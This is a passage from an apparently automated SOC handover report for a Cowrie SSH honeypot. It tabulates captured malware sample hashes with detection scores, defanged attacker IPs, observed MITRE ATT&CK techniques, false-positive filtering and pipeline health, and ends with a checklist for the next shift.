| `6b3a55e0261b0304143f805a24924d0c1c44524821305f31d9277843b8a10f4e` | Unknown binary | `6b3a55e0261b0304...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `72ce5b00ca4bfa0c18fcdf03a15e5391a85d81300783626598fe7e022e0ec538` | ELF Binary (Linux executable) (x86-64 64-bit) | `72ce5b00ca4bfa0c...` | 45/100 | 🟡 MEDIUM | **38/75** 🔴 |
| `776c0fccae481c384f5636903ce500fae22803cf8778ec9a029956bb85a68010` | ELF Binary (Linux executable) (x86-64 64-bit) | `776c0fccae481c38...` | 41/100 | 🟡 MEDIUM | **28/75** 🔴 |
| `77c2e7968f7695c1bfbe08f0c455cc95479a74cc7fdb432667e29bab08515ce1` | ELF Binary (Linux executable) (ARM 32-bit) | `77c2e7968f7695c1...` | 30/100 | 🟢 LOW | Not in VT |
| `7a9da7d10aa80b0f9e2e3f9e518030c86026a636e0b6de35905e15dd4c8e3e2d` | ELF Binary (Linux executable) (x86-64 64-bit) | `7a9da7d10aa80b0f...` | 45/100 | 🟡 MEDIUM | **39/76** 🔴 |
| `8daf92f0870c58ece8b68a3057c3ab6e8477215f853c54cdfe790acf1141161d` | ELF Binary (Linux executable) (ARM 32-bit) | `8daf92f0870c58ec...` | 44/100 | 🟡 MEDIUM | **36/75** 🔴 |
| `98babd858ec296d43844c96d53ff8713c44a451ba6e05b89d64c772828a0514d` | ELF Binary (Linux executable) (x86-64 64-bit) | `98babd858ec296d4...` | 45/100 | 🟡 MEDIUM | **37/74** 🔴 |
| `9a45029b646e2d20015695b5541f5fb76eace740bf329dc05af8ea53bd89619c` | Unknown binary | `9a45029b646e2d20...` | 0/100 | 🟢 LOW | 0/75 ✅ |
| `a04ac6d98ad989312783d4fe3456c53730b212c79a426fb215708b6c6daa3de3` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `a2812d2ca38cf4e519e386901fb89c393d891417a168a278bbb9b9d4f38145cc` | ELF Binary (Linux executable) (x86-64 64-bit) | `a2812d2ca38cf4e5...` | 43/100 | 🟡 MEDIUM | **34/75** 🔴 |
| `a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2` | Unknown binary | `a8460f446be54041...` | 12/100 | 🟢 LOW | **30/75** 🔴 |
| `db2b1183a337cdf116ec3158067f70502e4534b6c27dd3a984c0bacb030732d5` | ELF Binary (Linux executable) (x86-64 64-bit) | `db2b1183a337cdf1...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `e99df510c24950e447f6a471be7fb1b1f7716b0e882005db3511327cbc27b9ff` | ELF Binary (Linux executable) (ARM 32-bit) | `e99df510c24950e4...` | 30/100 | 🟢 LOW | 0/72 ✅ |
| `f200744b6900aeb0a27df08c71fc28a7f07b0aee21e844beca214eb8c4ab58dd` | ELF Binary (Linux executable) (x86-64 64-bit) | `f200744b6900aeb0...` | 43/100 | 🟡 MEDIUM | **33/74** 🔴 |
| `tmp3v3avwej` | EMPTY — Zero-byte file. Upload attempt captured by Cowrie but no pay... | `e3b0c44298fc1c14...` | 0/100 | 🟢 LOW | Not in VT |
| `tmp41sthfqu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpjyzmzmsu` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpw4ocpnlc` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |
| `tmpzmvvpi6d` | ELF Binary (Linux executable) (ARM 32-bit) | `a04ac6d98ad98931...` | 50/100 | 🟡 MEDIUM | **50/74** 🔴 |

---

## 🌐 Top Attacker IPs by Abuse Score

| IP | Country | ISP | Abuse Score | OTX Pulses |
|---|---|---|---|---|
| `107.180.69[.]136` | US | GoDaddy.com, LLC | **100** ⚠️ | 1 |
| `206.42.14[.]196` | BR | Brisanet Prestacao De Servicos De Internet Ltda | **100** ⚠️ | 38 |
| `120.48.15[.]138` | CN | Beijing Baidu Netcom Science and Technology Co., Ltd. | **100** ⚠️ | 50 |
| `193.106.245[.]20` | PL | P4 Sp. z o.o. | **100** ⚠️ | 0 |
| `101.126.71[.]100` | CN | Beijing Volcano Engine Technology Co., Ltd. | **100** ⚠️ | 0 |
| `162.252.39[.]3` | US | IT WORKS LLC | **100** ⚠️ | 0 |
| `170.82.76[.]2` | BR | THE FIBER INTERNET BANDA LARGA | **80** ⚠️ | 1 |
| `137.59.230[.]79` | PK | Cyber Internet Services Pakistan | **72** | 0 |
| `196.179.157[.]216` | TN | OOREDOOTN | **58** | 1 |
| `36.22.114[.]141` | CN | CHINANET-ZJ Jinhua node network | **33** | 0 |

---

## 🎯 Top TTPs Observed (MITRE ATT&CK)

| TTP ID | Count |
|---|---|
| [T1592](https://attack.mitre.org/techniques/T1592) | 72 |
| [T1110.001](https://attack.mitre.org/techniques/T1110/001) | 59 |
| [T1078](https://attack.mitre.org/techniques/T1078) | 12 |
| [T1021.004](https://attack.mitre.org/techniques/T1021/004) | 6 |
| [T1105](https://attack.mitre.org/techniques/T1105) | 6 |

---

## 🔕 False Positive Summary (13 filtered)

| Reason | Count |
|---|---|
| AbuseIPDB score 0 below threshold 25 | 4 |
| AbuseIPDB score 1 below threshold 25 | 1 |
| AbuseIPDB score 4 below threshold 25 | 1 |
| Mass-scanner pattern: no commands, no downloads, ≤2 login attempts | 7 |

> FP threshold: AbuseIPDB score < 25. Known scanner ISPs auto-filtered.

---

## ⚙️ Pipeline Health

| Tool | Role | Status |
|---|---|---|
| Tool 05  | Network Monitor (port 2222) | ✅ HEALTHY |
| Tool 26  | Incident Timeline Generator | ✅ 97 cases |
| Tool 34  | Credential Extractor        | ✅ 71 attempts |
| Tool 35  | SSH Fingerprint Aggregator  | ✅ 2 fingerprints |
| Tool 36  | Command Clustering          | ✅ 1 clusters |
| Tool 27  | Threat Intel Feeder         | ✅ 18 IPs enriched |
| Tool 29  | False Positive Tracker      | ✅ 13 filtered (13.4%) |
| Tool 30  | Metric Exporter             | ✅ stats.json written |
| Tool 30b | ASN Clustering              | ✅ 18 ASNs |
| Tool 31  | Malware Analyzer            | ✅ 28 files |
| Tool 33  | YARA Classifier             | ✅ 8 classified |
| Tool 28  | SOC Handover Report         | ✅ This report (v2.2) |

> **Report grouping:** 12 priority case(s) shown individually · 7 recon entry/entries in table (4 group(s) consolidating 69 session(s)).

---

## 📋 Standing Orders for Next Shift

- [ ] Verify honeypot is HEALTHY (Tool 05 green)
- [ ] Review any new HIGH/CRITICAL priority cases above
- [ ] Check AbuseIPDB for newly reported IPs from this shift
- [ ] If Cowrie captures a download, verify Tool 31 ran and check malware section
- [ ] Integrity baseline auto-recreates every 2 hours via pipeline

---

_Generated by THIR · Tool 28 v2.3 · SOC Handover Report Generator_  
_Pipeline: `nikhilsalunkemumbai/thir-live` · Cowrie SSH Honeypot · AWS EC2_  
_Report time: 2026-05-08T15:45:03Z_
